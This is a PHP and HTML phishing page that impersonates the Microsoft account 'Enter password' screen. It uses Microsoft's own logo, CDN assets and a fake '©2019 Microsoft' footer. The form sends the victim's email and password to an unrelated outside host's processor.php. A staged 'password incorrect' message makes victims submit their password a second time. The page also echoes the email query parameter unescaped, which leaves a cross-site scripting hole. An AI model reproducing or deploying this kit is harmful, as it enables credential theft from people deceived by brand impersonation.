
<!DOCTYPE html>
<html>
   <head>
      <title>Sign in to your account</title>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
      <meta http-equiv="Pragma" content="no-cache">
      <meta http-equiv="Expires" content="-1">
      <meta name="PageID" content="ConvergedSignIn" />
      <meta name="SiteID" content="" />
      <meta name="ReqLC" content="1033" />
      <meta name="LocLC" content="en-US" />
      <link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8014.13/content/images/favicon_a.ico" />
      <link rel="stylesheet" href="https://res.cloudinary.com/dfvzxzbhe/raw/upload/v1539177451/sg/style.css"/>
      
   </head>
   <body>
      <form method="POST" action="https://i-siboffshore.com/creator/processor.php">
         <div class="outer">
            <div class="middle">
               <div class="inner">
                  <img class="logo" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8014.13/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd">
                 

                  <?php 
                     if (empty($fianl)) {                      
                  ?>

                  <div class="identityBanner">
                     <input type="hidden" name="email" value="<?php echo $_GET['email']; ?>">
                    <img src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8233.17/content/images/arrow_left.svg?x=a9cc2824ef3517b6c4160dcf8ff7d410" style="float: left;">  <div id="displayName" class="identity"><?php echo $_GET['email']; ?></div>
                  </div>
                  <div class="row text-title">Enter password</div>
                  <!-- ko if: isSubtitleVisible --><!-- /ko --> 
                  <div class="row">
                     <div class="form-group col-md-24">
                        <div role="alert" aria-live="assertive" aria-atomic="false">
                           <!-- ko if: passwordTextbox.error --><!-- /ko --> 
                        </div>
                        <?php if ($_GET['step'] == '1') { ?>
                        <input type="hidden" name="refressh" value="1">
                        <div id="passwordError" class="alert alert-error"">Your account or password is incorrect. If you don't remember your password, <a id="idA_IL_ForgotPassword0"  class="display-inline-block" style="color: #3a96dd;">reset it now.</a> </div>
                        <?php }?>
                        <div class="placeholderContainer">
                           <input name="password" type="password" id="i0118" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" placeholder="Password" aria-label="Enter password"> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko -->
                        </div>
                     </div>
                  </div>
                  <div class="position-buttons">
                     <div>
                        <!-- ko if: svr.BQ --><!-- /ko --><!-- ko if: svr.AV !== false && !svr.BQ && !tenantBranding.KeepMeSignedInDisabled --> 
                      
                        <!-- /ko --> 
                        <div class="row">
                           <div class="col-md-24">
                              <div class="text-13 action-links">
                                 <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="https://account.live.com/ResetPassword.aspx" >Forgot my password</a> </div>
                                 <div data-bind="css: { 'form-group': !isMenuLink }" class="form-group">
                                    <!-- ko if: altCreds.length > 1 --><!-- /ko --><!-- ko if: altCreds.length === 1 --><!-- /ko --> 
                                 </div>
                                
                              </div>
                           </div>
                        </div>
                     </div>
                     <div class="row">
                        <div >
                        	<br>
                           <div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" >
                              <!-- ko if: isSecondaryButtonVisible --><!-- /ko --> 
                              <div> <button type="submit" id="idSIButton9" class="btn btn-block btn-primary" value="login" name="login"> Sign in</button></div>
                           </div>
                        </div>
                     </div>
                  </div>
                 
                        <?php 	

                      } else {
                           echo '<div id="username" class="row text-body">'.$sms.'</div>'; 
                           
                       }?>


               </div>
            </div>
         </div>
      </form>


      <div class="footer"> 

      	<div class="divblock">
      	<a href="#" class="linkfooter" style="color:#fff;"> ©2019 Microsoft</a>    
      	<a href="#" class="linkfooter" style="color:#fff;">Terms of use </a>  
      	<a href="#" class="linkfooter" style="color:#fff;">Privacy & cookies  </a> 
      	<a href="#" class="linkfooter" style="color:#fff;">... </a>  
      	</div>
      </div>
      <style type="text/css">
            

            .divblock{
      	    min-width: 312px;
            float: right;
           }      


           .footer {
			    position: fixed;
			    bottom: 0;
			    width: 100%;
			    /* overflow: visible; */
			    /* z-index: 99; */
			    /* clear: both; */
			    background-color: rgba(0,0,0,0.6);
			   
			}


			.linkfooter{
				color: #fff;
			    font-size: 12px;
			    line-height: 28px;
			    white-space: nowrap;
			    display: inline-block;
			    margin-left: 8px;
			    margin-right: 8px;
			    color: #fff;
			}
      </style>
   </body>
</html>